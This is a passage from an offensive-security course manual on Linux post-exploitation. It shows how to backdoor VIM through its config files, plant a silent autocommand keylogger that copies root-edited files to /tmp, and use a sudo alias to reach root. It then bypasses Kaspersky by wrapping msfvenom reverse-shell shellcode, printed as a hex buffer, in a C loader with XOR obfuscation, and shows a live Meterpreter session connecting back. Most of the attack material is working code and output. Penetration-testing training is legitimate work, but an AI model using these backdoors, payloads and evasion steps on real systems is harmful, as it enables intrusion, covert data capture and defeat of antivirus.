extra effort. On a Debian or similar system that does not persist the user’s shell environment 
information when moving to a sudo context, we can add an alias571 to the user’s .bashrc file. 
alias sudo="sudo -E" 
Listing 444 - Alias to force sudo to use current user’s environment 
An alias is just a shortcut to substitute a different command when a specific command is entered 
on the command line. The alias above replaces a standard sudo call with one that will force sudo 
to persist the user’s VIM settings. The shell script being loaded will then also run as root. We will 
need to source our .bashrc file from the command line if we want the alias changes to go into 
effect right away. 
offsec@linuxvictim:~$ source ~/.bashrc 
Listing 445 - Forcing alias changes to go into effect immediately 
In some cases, users are given limited sudo rights to run only specific programs. We can check 
this from a shell using the following command (we’re using the linuxvictim user here). 
linuxvictim@linuxvictim:~$ sudo -l 
Matching Defaults entries for linuxvictim on linuxvictim: 
    env_reset, mail_badpass, 
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/b
in 
 
User linuxvictim may run the following commands on linuxvictim: 
    (root) NOPASSWD: /usr/bin/vim /opt/important.conf  
Listing 446 - Sudo rights for a user 
This limited access can be set in the /etc/sudoers file with the same syntax as the highlighted line 
above. When a command is specified at the end of the line, the user can run sudo only for that 
command. In the above case, the linuxvictim user has the ability to use VIM as sudo only to open 
the /opt/important.conf file. 
 
570 (Die.net, 2012), https://linux.die.net/man/8/visudo 
571 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Alias_(command) 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
378 
In this case, a password is not required for sudo access. Because of this, we can run VIM and 
then enter :shell to gain a root shell automatically. If a password was required, we could use the 
previously discussed alias vector to gain root access with our backdoor script. 
Note that many administrators now require the use of sudoedit572 for modifying 
sensitive files. This process makes copies of the files for the user to edit and 
then uses sudo to overwrite the old files. It also prevents the editor itself from 
running as sudo. Having said this, it is also not uncommon to find that system 
administrators simply add VIM to the allowed commands in the sudoers file 
instead. 
We’ve discussed a way to run scripts via a VIM backdoor, but what happens if the environment is 
restricted and won’t allow shell access? Let’s examine a method for creating a rudimentary 
“keylogger” through VIM that operates even in a restricted VIM session. 
10.1.1.1 Exercises 
1. 
Backdoor VIM as described in the module by modifying the user’s .vimrc file directly and 
running a command while silencing the output. 
2. 
Backdoor VIM by adding a script to the VIM plugins folder. 
3. 
Backdoor VIM by sourcing a secondary shell script in the user’s .vimrc file while silencing the 
output. 
4. 
Create an alias for the user for sudo to preserve the user’s environment and activate it by 
sourcing the user’s .bashrc file. Then execute a command as root by running VIM as sudo. 
5. 
Using the linuxvictim user, run VIM via sudo and get a root shell using the :shell command. 
10.1.1.2 Extra Mile 
Get a reverse shell using the above VIM backdoor as root.  
10.1.2 
VIM Config Simple Keylogger 
As we’ve mentioned, it’s possible to enter various commands into VIM’s .vimrc configuration files 
to perform actions when the application starts or within a running editor session. VIM also gives 
the ability for a user (or in our case, an attacker) to define actions to be performed when various 
trigger conditions occur. This is done through the use of autocommands.573 
In this scenario, we want to create a rudimentary keylogger to log any changes a user makes to a 
file using our compromised VIM editor. This could be useful for capturing sensitive data in 
configuration files or scripts. 
 
572 (Die.net, 2012),https://linux.die.net/man/8/sudoedit 
573 (Bram Moolenaar, 2010), http://vimdoc.sourceforge.net/htmldoc/autocmd.html 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
379 
We won’t be able to use our previous approach because the current system uses a restricted VIM 
environment that blocks any shell commands. Thankfully, autocommand settings are internal to 
VIM and do not require the shell. 
We can use :autocmd in a VIM configuration file or in the editor to set actions for a collection of 
predefined events. A complete list is too extensive to include here, but can be viewed at the 
autocommand reference linked above. 
Some useful examples are VimEnter (entering VIM), VimLeave (leaving VIM), FileAppendPre (right 
before appending to a file), and BufWritePost (after writing a change buffer to a file). All of these 
provide different triggers for performing actions that might benefit an attacker. 
We don’t want to risk preventing the user from actually saving their files as this might alert them. 
To avoid this, we can perform our actions based on the BufWritePost event in VIM. This activates 
once a buffer has already been written to the intended file. 
We can define an autocommand using the autocmd keyword. We then specify which 
autocommand trigger we want to use, then identify which files we want it to act on. Finally, we’ll 
provide the command we want to perform once the action is triggered. 
Let’s set up an autocommand that fires on the BufWritePost action and then writes the content of 
the file to a log file we specify. We want the action to work on all files being edited. The command 
would look something like this. 
:autocmd BufWritePost * :silent :w! >> /tmp/hackedfromvim.txt 
Listing 447 - Setting an action for our autocommand event 
In the above command, we start by specifying that we’re defining an autocommand via 
:autocmd. BufWritePost is the event we’re going to trigger on, meaning that after a buffer is 
written to a file, we will perform our action. The “*” specifies that this action will be performed for 
all files being edited. We could change this to match only files with a particular name or file 
extension, but in our case we want to do this for every file. Everything after this point is the actual 
command we’ll perform when the trigger is activated. 
The command being run after our condition is triggered is made up of several subcommands. 
First, we specify that there shouldn’t be any debug output by using the :silent command. We 
then use :w! to save the buffer contents. The exclamation point (!) is a force modifier. In this 
case, it will overwrite an existing file if one exists and write to file, even if the file doesn’t already 
exist. We then redirect the output to append to /tmp/hackedfromvim.txt. 
Putting the above command into our user’s .vimrc file is not very discreet, so let’s add a layer of 
obfuscation. To do this, we can load a secondary VIM configuration file from a different location. 
We’ll put our command in /home/offsec/.vim/plugin/settings.vim. While this doesn’t prevent the 
user from viewing the file, it does make it less likely the user will see it. 
If we run VIM on a test file and insert any content, we notice that we don’t get any error messages 
or indication that anything is wrong. Additionally, our output file was written successfully as 
shown in the listing below. 
offsec@linuxvictim:~$ vi /tmp/test.txt 
 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
380 
offsec@linuxvictim:~$ ls -al /tmp/hackedfromvim.txt 
-rw-rw-r-- 1 offsec offsec 26 Jul 31 13:52 /tmp/hackedfromvim.txt 
Listing 448 - Our attack worked successfully 
It’s also possible to run shell commands on an autocommand trigger. For 
example, if we wanted to run a shell script instead of saving the buffer to a file, 
we could just replace everything after “:silent” with “!” followed by a shell script 
name or shell command. Note that in our current restricted environment, we 
can’t use this approach. 
This approach is useful, but it logs the entire contents of the changed file to our log file for every 
file the target user edits. Our log file could grow quickly. Let’s refine our attack to include only files 
that the user is editing using elevated permissions. 
Thankfully, VIM allows for control logic in its internal scripting language. Additionally, as we 
mentioned earlier, it’s possible to access environment variables from within VIM, including which 
user the application is running as. Let’s put these together to make our keylogger more efficient. 
VIM supports the use of basic if statements in its configuration scripts in this manner. 
:if <some condition> 
:<some command> 
:else 
:<some alternative command> 
:endif 
Listing 449 - Control logic in VIM config files 
Combining this with the ability to use environment variables, we can check whether the user is 
running as root. 
:if $USER == "root" 
:autocmd BufWritePost * :silent :w! >> /tmp/hackedfromvim.txt 
:endif 
Listing 450 - Checking if our user is root 
Let’s replace our line in settings.vim with this. 
Previously, we discussed how in some system configurations it’s possible to persist the VIM’s 
user environment settings in a sudo context. In these situations, when the user runs VIM as 
themselves, VIM behaves normally. When they run VIM in a sudo context, however, the keylogger 
will write any changes they make to files to the log file we’ve specified. 
offsec@linuxvictim:~$ rm /tmp/hackedfromvim.txt 
 
offsec@linuxvictim:~$ vi /tmp/test.txt 
 
offsec@linuxvictim:~$ ls -al /tmp/hackedfromvim.txt 
ls: cannot access '/tmp/hackedfromvim.txt': No such file or directory 
 
offsec@linuxvictim:~$ sudo vi /tmp/test.txt 
 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
381 
offsec@linuxvictim:~$ ls -al /tmp/hackedfromvim.txt 
-rw-r--r-- 1 root root 31 Jul 31 14:02 /tmp/hackedfromvim.txt 
Listing 451 - Running the exploit as sudo 
From the results in listing 451, we find that our attempt at running VIM as a normal user didn’t 
result in the creation of our log file. However, when we run as sudo, the log file is created under 
the root user. 
In this section, we discussed creating a rudimentary keylogger or file content monitoring utility 
with VIM’s autocommand feature, as well as how to silence the output and provide some control 
logic to its actions. This provides additional attack vectors and allows us to potentially escalate 
our privileges once we’ve gained an initial foothold. 
Next, we’ll change topics and find ways to bypass antivirus on Linux in order to run malicious 
payloads. 
10.1.2.1 Exercises 
1. 
Use an autocommand call to write a simple VIM keylogger and silence it as in this section, 
sourcing it from a separate file than the user’s .vimrc file. 
2. 
Modify the keylogger to only log modified file contents if the user is root. 
10.2 Bypassing AV 
Linux-based antivirus solutions are less commonly deployed than Windows-based solutions. 
Malware authors tend to focus less on Linux than Windows as the majority of endpoint users are 
in a Windows environment. This doesn’t mean that Linux-based antivirus solutions are ineffective, 
but overall they tend to be less cutting-edge than Windows-based solutions.574 
Servers running Linux often have business-critical roles and support essential services. Because 
of the limited effectiveness of antivirus on Linux, the impact of malware on these systems could 
be higher than their Windows counterparts. 
In this section, we’ll bypass the modern Linux-based Kaspersky Endpoint Security antivirus 
solution.575 
10.2.1 
Kaspersky Endpoint Security 
Kaspersky is a well-known and widely-used vendor for antivirus products and as such, provides a 
good baseline for testing antivirus protections on Linux systems. Kaspersky’s Endpoint Security 
product, by default, enables real-time protection. We’ll disable this for now to more clearly 
demonstrate some foundational concepts. 
We can turn Kaspersky off using the kesl-control utility. We need to use the --stop-t flag, 
which stops a specified task number. The documentation indicates that real-time protection runs 
as task number 1. 
 
574 (AV Test, 2015), https://www.av-test.org/en/news/linux-16-security-packages-against-windows-and-linux-malware-put-to-the-test/ 
575 (Kaspersky, 2020), https://support.kaspersky.com/kes11linux 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
382 
offsec@linuxvictim:/opt/av$ sudo kesl-control --stop-t 1 
[sudo] password for offsec:  
Task has been stopped 
Listing 452 - Disabling realtime protection for our initial tests 
In a real-world scenario, we wouldn’t be able to turn off real-time protection unless we had 
elevated privileges, but this makes it a bit easier to demonstrate the detection capability of 
Kaspersky on some basic files. If we don’t turn off real-time protection, our demonstration files 
will be immediately deleted on download or file access. Moving forward, we’ll manually scan the 
files we want to check. 
First, we’ll try the EICAR test file.576 This file is used by antivirus vendors to test the detection 
capabilities of their products. All modern antivirus systems are trained on this and should detect 
it. 
Let’s run a scan on the EICAR test file found at /opt/av/eicar.txt. 
During testing, if the file is deleted and we want to reproduce the original EICAR file on the VM, we 
can use the following command. Note that it’s important to ensure real-time protection is turned 
off when performing this step or the file will be deleted again. 
offsec@linuxvictim:/opt/av$ sudo gpg -d eicar.txt.gpg > eicar.txt 
Listing 453 - Repairing the EICAR file 
The command decrypts the encrypted version of the EICAR file (with the password “lab”) and 
copies it back to the eicar.txt file. 
To perform the scan, we can run the kesl-control utility as before, but this time with the --
scan-file flag, which specifies a file to scan for viruses. 
In the following commands, we check to ensure the file exists, run a scan on our EICAR test file, 
and then confirm that the file was deleted from the file system by Kaspersky. 
offsec@linuxvictim:/opt/av$ ls -al eicar.txt 
-rwxrwxrwx 1 root root 68 Jul  1 15:34 eicar.txt 
 
offsec@linuxvictim:/opt/av$ sudo kesl-control --scan-file ./eicar.txt 
Scanned objects                     : 1 
Total detected objects              : 1 
Infected objects and other objects  : 1 
Disinfected objects                 : 0 
Moved to Storage                    : 1 
Removed objects                     : 1 
Not disinfected objects             : 0 
Scan errors                         : 0 
Password-protected objects          : 0 
Skipped objects                     : 0 
 
offsec@linuxvictim:/opt/av$ ls -al eicar.txt 
ls: cannot access 'eicar.txt': No such file or directory 
Listing 454 - Scanning EICAR test file 
 
576 (Eicar, 2020), https://www.eicar.org/?page_id=3950 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
383 
We can view the name of the detected infection by querying Kaspersky’s event log. To do this, we 
need to specify -E to review the event log and --query to list out the items detected. We can 
then use grep to filter on “DetectName” to display the names of the detected malware. 
offsec@linuxvictim:/opt/av$ sudo kesl-control -E --query | grep DetectName 
DetectName=EICAR-Test-File 
Listing 455 - Viewing EICAR test file scan output 
The resulting DetectName entry states that Kaspersky detected the EICAR test file, which is what 
we were initially scanning. This confirms Kaspersky is working properly and detecting malicious 
files. 
Next, we’ll try scanning a Meterpreter payload. Let’s generate an unencoded 64-bit Linux 
Meterpreter reverse TCP payload (linux/x64/meterpreter/reverse_tcp) on Kali as an ELF file 
named met.elf and then transfer it to the lab machine in the /tmp directory. 
If we run a scan with Kaspersky on our met.elf file as we did with our EICAR test file, the file is 
detected as malware. 
offsec@linuxvictim:/tmp$ sudo kesl-control --scan-file ./met.elf 
Scanned objects                     : 1 
Total detected objects              : 1 
Infected objects and other objects  : 1 
Disinfected objects                 : 0 
Moved to Storage                    : 1 
Removed objects                     : 1 
Not disinfected objects             : 0 
Scan errors                         : 0 
Password-protected objects          : 0 
Skipped objects                     : 0 
 
offsec@linuxvictim:/tmp$ sudo kesl-control -E --query | grep DetectName 
DetectName=EICAR-Test-File 
DetectName=HEUR:Backdoor.Linux.Agent.ar 
Listing 456 - Scanning a Meterpreter shell ELF 
The results show that our Meterpreter ELF file was detected, automatically deleted, and 
categorized as “Backdoor.Linux.Agent.ar”. 
If we try a few variations on this, we notice different results. 32-bit Meterpreter payloads are 
caught with or without an encoder set (using x86/shikata_ga_nai) when generating the 
Meterpreter ELF file. However, a 64-bit Meterpreter payload encoded with the x64/zutto_dekiru 
encoder is not detected by the AV as shown in the listing below. 
offsec@linuxvictim:/tmp$ sudo kesl-control --scan-file ./met64zutto.elf  
Scanned objects                     : 1 
Total detected objects              : 0 
Infected objects and other objects  : 0 
Disinfected objects                 : 0 
Moved to Storage                    : 0 
Removed objects                     : 0 
Not disinfected objects             : 0 
Scan errors                         : 0 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
384 
Password-protected objects          : 0 
Skipped objects                     : 0 
Listing 457 - 64-bit Zutto_Dekiru-encoded Meterpreter ELF file scanned 
Let’s try a different approach and put our unencoded x64 payload into a C program as shellcode 
instead. 
This time, we’ll restore real-time protection to make things more realistic. We can do this by again 
running kesl-control, this time using the --start-t flag, which starts a task. We’ll specify task 
“1” again (the real-time protection task). 
offsec@linuxvictim:/tmp$ sudo kesl-control --start-t 1 
[sudo] password for offsec:  
Task has been started 
Listing 458 - Re-enabling realtime protection for our initial tests 
Now that real-time protection is enabled, when we access or run a file, Kaspersky will 
automatically scan it for viruses. 
We can regenerate a 64-bit unencoded shellcode with msfvenom, this time with an output type of 
“c”, on our Kali VM. We will then insert it in a C program, which will act as a wrapper to load and 
run the shellcode. 
We haven’t covered C programming in this course, so let’s take a moment to review each part of 
the code individually. 
The first three lines are include statements. They allow us access to functions included in the 
libraries that are defined by the C programming language standard.577 
#include <stdio.h> 
#include <stdlib.h> 
#include <unistd.h> 
Listing 459 - C code wrapper include statements 
The next section is an unsigned character array variable called buf that contains our shellcode 
output in C format from msfvenom. 
// Our payload generated by msfvenom 
unsigned char buf[] =  
"\x48\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9" 
"\x6a\x22\x41\x5a\xb2\x07\x0f\x05\x48\x85\xc0\x78\x51\x6a\x0a" 
"\x41\x59\x50\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05" 
"\x48\x85\xc0\x78\x3b\x48\x97\x48\xb9\x02\x00\x05\x39\xc0\xa8" 
"\x76\x03\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x59" 
"\x48\x85\xc0\x79\x25\x49\xff\xc9\x74\x18\x57\x6a\x23\x58\x6a" 
"\x00\x6a\x05\x48\x89\xe7\x48\x31\xf6\x0f\x05\x59\x59\x5f\x48" 
"\x85\xc0\x79\xc7\x6a\x3c\x58\x6a\x01\x5f\x0f\x05\x5e\x6a\x7e" 
"\x5a\x0f\x05\x48\x85\xc0\x78\xed\xff\xe6"; 
Listing 460 - C code wrapper payload buffer 
The final section is the main function. 
 
577 (open-std.org, 2013), http://www.open-std.org/JTC1/SC22/WG14/www/standards 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
385 
int main (int argc, char **argv)  
{ 
    // Run our shellcode 
    int (*ret)() = (int(*)())buf; 
    ret(); 
 
} 
Listing 461 - C code wrapper main function 
This contains the content of our program and is run when our program starts. The main function 
takes two arguments, an integer called argc, which stores how many arguments are passed to 
the program and one called argv, which is an array of strings containing the actual values of the 
arguments passed to the program. 
Inside our main function, we have two lines of code that can seem a little complicated. The C 
language supports pointers.578 A pointer variable (indicated by a * between the variable type and 
the variable name) just stores the address of a place in memory that points to a value of the type 
we specify. Let’s examine a quick example. 
int myvalue = 10; 
int* myptr = &myvalue; 
int myothervalue = *myptr; 
Listing 462 - Pointers in C 
In the above code, we create an integer variable called myvalue, which has a value of “10”. 
In the second line, we create an integer pointer called myptr as indicated by int*. This points to a 
place in memory that stores an integer value, in this case, the value of the myvalue variable we 
created in the previous line. The address of the myvalue variable is retrieved by using an 
ampersand (&) character before the variable name. 
In the final line, we use the dereference operator579 (*) to get the value stored at the address in 
myptr and save it in the myothervalue variable. 
If we ran code to print the contents of all three variables, we would receive output something like 
this. 
myvalue: 10 
myptr: 1793432192 
myothervalue: 10 
Listing 463 - Values of the different variables 
The myvalue output is “10” because we’re printing out the value of the variable itself. The myptr 
value shown is the value stored by the pointer. As we know, pointers store memory addresses, so 
this value is the memory address where the myvalue variable is being stored. The myothervalue 
variable is retrieving the data stored at the location pointed to by our myptr value. Because myptr 
is storing the location of our first variable myvalue, and we’re retrieving the information stored 
there, we get an output of “10”. This is because myothervalue is accessing the same data as what 
is stored in myvalue by using a pointer. 
 
578 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Pointer_(computer_programming) 
579 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Dereference_operator 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
386 
Now that we’ve covered how pointers work, we can examine the last two lines in our shellcode 
encoder’s main function. 
int (*ret)() = (int(*)())buf; 
ret(); 
Listing 464 - Our last two lines of main 
In the first line of Listing 464, we are defining a function pointer580 called ret. 
A thorough coverage of function pointers and how they work is outside the scope 
of this course. At a high-level, they work the same way as a pointer to other types 
of objects in memory, except they point to a place in memory where function 
code is stored. 
In our code above, the ret function takes in no arguments (as indicated by the empty parentheses 
to the left of the equals sign). 
int (*ret)() = ... 
Listing 465 - Our function doesn’t take any arguments 
The int on the left indicates that our function returns an integer value. 
On the right of the equals sign, we have the name of our shellcode variable, buf, but with some 
elements within parentheses before it: 
... = (int(*)())buf; 
Listing 466 - Casting our buffer as a function pointer 
The parentheses and their contents just indicate that we’re casting581 our buf variable to be a 
function pointer. Normally, character array variables are just pointers to a set of characters in 
memory, so it’s already a pointer. In this case, we’re casting it to be a function pointer specifically. 
This allows us to call our buf shellcode like any other function. 
The last line of our main function just takes the function pointer we’ve created (called ret) and 
calls the function it points to, which is our shellcode. 
Once our wrapper program is written, we’ll set up a listener in Metasploit matching our shellcode 
type. Then we’ll compile our code with the Gnu C Compiler582 (gcc). 
Our buf variable is a local variable and as such, is stored on the stack.583 Our shellcode execution 
would normally be blocked as the stack is marked as non-executable for binaries compiled by 
modern versions of gcc. We can explicitly allow it with the -z execstack parameter.584 
 
580 (Alex Allain, 2019), https://www.cprogramming.com/tutorial/function-pointers.html 
581 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Type_conversion 
582 (Free Software Foundation, Inc. , 2020), https://gcc.gnu.org 
583 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Local_variable 
584 (Rapid7, 208), https://github.com/rapid7/metasploit-framework/issues/9663 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
387 
We’ll provide an output file, hack.out, with the -o parameter and a source code file, hack.c. 
offsec@linuxvictim:/tmp$ gcc -o hack.out hack.c -z execstack 
Listing 467 - Compiling our C code wrapper 
Note that we can compile this example on our Kali VM or the linuxvictim VM in 
our lab. In a real-world environment, if compiling on Kali, we would need to be 
sure the processor architecture matched the target environment. 
Next, we can run our shellcode wrapper. 
offsec@linuxvictim:/tmp$ ./hack.out 
Listing 468 - Running our C code wrapper 
On our Metasploit side, we receive our shell. 
msf5 exploit(multi/handler) > run 
 
[*] Started reverse TCP handler on 192.168.119.120:1337  
[*] Sending stage (3021284 bytes) to 192.168.120.45 
[*] Meterpreter session 6 opened (192.168.119.120:1337 -> 192.168.120.45:52140) 
 
meterpreter > getuid 
Server username: uid=1000, gid=1000, euid=1000, egid=1000 
Listing 469 - Receiving a shell from our C code wrapper 
We know our shellcode wrapper program works even though Kaspersky real-time scanning is 
enabled, but let’s try explicitly scanning it with Kaspersky just to find out what happens. 
offsec@linuxvictim:/opt/av$ sudo kesl-control --scan-file ./hack.out 
Scanned objects                     : 1 
Total detected objects              : 0 
Infected objects and other objects  : 0 
Disinfected objects                 : 0 
Moved to Storage                    : 0 
Removed objects                     : 0 
Not disinfected objects             : 0 
Scan errors                         : 0 
Password-protected objects          : 0 
Skipped objects                     : 0 
offsec@linuxvictim:/opt/av$  
Listing 470 - Scan results from our C code wrapper 
Surprisingly, we can bypass Kaspersky by simply wrapping our shellcode in a C program. 
Kaspersky was fairly easy to bypass. However, not all antivirus products are the same, so let’s try 
an alternative. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
388 
10.2.2 
Antiscan.me 
The AntiScan.me585 website is a good option to check multiple scanners at the same time. We 
can use this service to check our C shell wrapper binary and determine if it’s detected by any 
other products. 
Antiscan.me only allows three free scans daily, so we will want to choose our 
scans wisely or pay for a subscription. The number of detections may vary 
depending on the version of payload being used and any configuration changes 
made by Antiscan to their infrastructure. 
Lets run a simple test using a known malicious file. A good choice would be the simple 
Meterpreter ELF files that we generated earlier. 
Because of the daily scan limit, performing this scan while following along is not 
necessary. We’ve included it here in order to demonstrate the results of a simple 
example. 
Antiscan will only accept files with an extension of .exe so we will rename the file in our Kali VM 
and then upload it to Antiscan’s website. This may not be a completely valid test as we don’t 
know how Antiscan handles files on the backend, and the requirement to have files with an 
extension of .exe indicates they’re likely expecting Windows malware samples. Still, this test will 
allow us to at least get an idea of whether basic Linux Meterpreter payloads are caught. 
First, we’ll scan the 32-bit Linux Meterpreter ELF file that we generated previously. The file is 
detected by 8 of 26 scanners. At least some of the scanners recognize the file specifically as an 
ELF file with a malicious payload or as a Linux-based threat. This tells us that AntiScan.me is at 
least partially Linux-aware. 
 
585 (AntiScan.Me, 2020), https://www.antiscan.me/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
389 
 
Figure 167: 32-bit Linux Meterpreter scanned 
If we try to scan our 64-bit Linux Meterpreter ELF file, as shown in the image below, it is detected 
by four of the scanners. This isn’t a reassuring result, but at least some of the products detect our 
file. Note that the scanners identify the file as an ELF file and the payload as Linux-based, similar 
to our 32-bit file. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
390 
 
Figure 168: Generic Meterpreter shell scanned 
While Antiscan.me is likely geared toward Windows binaries, based on the 
required file extension being .exe, we can observe that its scanners use 
signatures for Linux-based malware as well. The major competitor/alternative 
option for this service is VirusTotal, which reports submitted samples to antivirus 
companies to develop detection signatures. In our case, this is undesirable, 
which is why we prefer Antiscan.me. 
Also note that Kaspersky detected the binary in the same manner as it did on our system, which 
indicates that the signatures are the same and we’re doing at least a reasonably fair comparison. 
Now that we know the scanners work, we’ll try our simple C shellcode wrapper binary. After 
renaming with an .exe extension, and downloading the file to our Kali VM, we can upload it to the 
website. 
Surprisingly, it only gets 2 detections out of 26 possible scanners. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
391 
 
Figure 169: C wrapper scanned by Antiscan 
Avast and AVG both detected our sample as malicious and, as expected, Kaspersky did not. 
Although this is a satisfactory result, let’s Try Harder. 
In order to avoid detection by the last two scanners, we’ll obfuscate our original shellcode string. 
We can do this by creating an encoder program to perform an XOR586 operation on our payload 
string to produce the new obfuscated version. 
We’ll then take the output of our encoder and replace our original C wrapper’s payload with the 
obfuscated version we produced. We’ll also add an XOR decoder to our original C program to 
deobfuscate the payload in memory before executing it. 
The code for our encoding program is very similar to our original C program. The key difference 
lies in the main loop. Instead of running the payload, we’re converting each character using XOR 
and printing it to the console. 
#include <stdio.h> 
#include <stdlib.h> 
#include <unistd.h> 
 
unsigned char buf[] =  
"\x6a\x39\x58\x0f\x05\x48\x85\xc0\x74\x08\x48\x31\xff\x6a\x3c" 
"\x58\x0f\x05\x6a\x39\x58\x0f\x05\x48\x85\xc0\x74\x08\x48\x31" 
 
586 (Wikipedia, 2020), https://en.wikipedia.org/wiki/XOR_cipher 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
392 
"\xff\x6a\x3c\x58\x0f\x05\x48\x31\xff\x6a\x09\x58\x99\xb6\x10" 
"\x48\x89\xd6\x4d\x31\xc9\x6a\x22\x41\x5a\xb2\x07\x0f\x05\x48" 
"\x85\xc0\x78\x51\x6a\x0a\x41\x59\x50\x6a\x29\x58\x99\x6a\x02" 
"\x5f\x6a\x01\x5e\x0f\x05\x48\x85\xc0\x78\x3b\x48\x97\x48\xb9" 
"\x02\x00\x05\x39\xc0\xa8\x76\x03\x51\x48\x89\xe6\x6a\x10\x5a" 
"\x6a\x2a\x58\x0f\x05\x59\x48\x85\xc0\x79\x25\x49\xff\xc9\x74" 
"\x18\x57\x6a\x23\x58\x6a\x00\x6a\x05\x48\x89\xe7\x48\x31\xf6" 
"\x0f\x05\x59\x59\x5f\x48\x85\xc0\x79\xc7\x6a\x3c\x58\x6a\x01" 
"\x5f\x0f\x05\x5e\x6a\x7e\x5a\x0f\x05\x48\x85\xc0\x78\xed\xff" 
"\xe6"; 
 
int main (int argc, char **argv)  
{ 
    char xor_key = 'J'; 
    int payload_length = (int) sizeof(buf); 
 
    for (int i=0; i<payload_length; i++) 
    { 
        printf("\\x%02X",buf[i]^xor_key); 
    } 
 
    return 0; 
 
} 
Listing 471 - Code to XOR encode our shellcode and output to the screen 
The code includes our original msfvenom-generated shellcode buffer as a character array. It 
defines an XOR key value (in this case, “J”) and calculates the length of the buffer string. It then 
stores that value as an integer in the payload_length variable. 
char xor_key = 'J'; 
int payload_length = (int) sizeof(buf); 
Listing 472 - First part of our encoder’s main loop 
The program then iterates through the characters, performing a bitwise-XOR operation on them 
with the XOR key we chose. Next, it prints the newly-encoded hex value to the screen so that we 
can copy it later. 
for (int i=0; i<payload_length; i++) 
    { 
        printf("\\x%02X",buf[i]^xor_key); 
    } 
Listing 473 - Second part of our encoder’s main loop 
We can use gcc to compile our encoder. Once we’ve done that, we can run it to output the 
encoded version of our shellcode. 
kali@kali:~$ gcc -o encoder.out encoder.c 
 
kali@kali:~$ ./encoder.out  
\x20\x73\x12\x45\x4F\x02\xCF\x8A\x3E\x42\x02\x7B\xB5\x20\x76\x12\x45...\x20\x4B\x14\x4
5\x4F\x02\xCF\x8A\x32\x71\x02\xDD\x02\xF3\x48 
Listing 474 - Output of our XOR encoder 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
393 
We can copy the output string from our encoder and replace the payload string in our original C 
wrapper. In addition, we need to modify our original C wrapper’s main function to decode the 
shellcode before we try to run it. The updated program is shown in the Listing 475. 
#include <stdio.h> 
#include <stdlib.h> 
#include <unistd.h> 
 
// Our obfuscated shellcode 
unsigned char buf[] = 
"\x20\x73\x12\x45\x4F\x02\xCF\x8A...x32\x71\x02\xDD\x02\xF3\x48"; 
 
int main (int argc, char **argv)  
{ 
    char xor_key = 'J'; 
    int arraysize = (int) sizeof(buf); 
    for (int i=0; i<arraysize-1; i++) 
    { 
        buf[i] = buf[i]^xor_key; 
    } 
    int (*ret)() = (int(*)())buf; 
    ret(); 
} 
Listing 475 - Updated C wrapper program with our encoded shellcode 
Our newly-modified C wrapper program behaves as a combination of our original C wrapper and 
our encoder program. We define our payload buffer, which is now obfuscated, as the result of our 
encoder program’s output. We define our XOR key and get the size of the payload, stored in the 
arraysize variable. We then iterate through the payload string as we did in the encoder, performing 
an XOR operation on each character as we did before. 
Since our payload is already obfuscated and XOR is a symmetric cipher, performing XOR on it 
with the same key will deobfuscate each character, resulting in our original payload string. We 
then run our shell as we did in our original C wrapper. 
If we compile and run the program, we notice that we get a shell in our Metasploit listener. 
msf5 exploit(multi/handler) > run 
 
[*] Started reverse TCP handler on 192.168.118.3:1337  
[*] Sending stage (3012516 bytes) to 192.168.120.45 
